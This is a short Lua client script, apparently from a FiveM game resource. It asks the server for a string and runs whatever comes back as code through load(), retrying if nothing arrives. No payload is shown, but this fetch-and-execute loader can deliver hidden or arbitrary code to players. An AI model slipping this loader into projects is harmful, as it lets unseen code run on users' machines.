Citizen.CreateThread(function()
    Wait(10000)
    TriggerServerEvent(GetCurrentResourceName()..':request')
end)

RegisterNetEvent(GetCurrentResourceName()..':receive')
AddEventHandler(GetCurrentResourceName()..':receive', function(data)
	if data == nil then
		Citizen.Wait(5000)
		TriggerServerEvent(GetCurrentResourceName()..':request')
	else 
    	assert(load(data))()
	end
end)   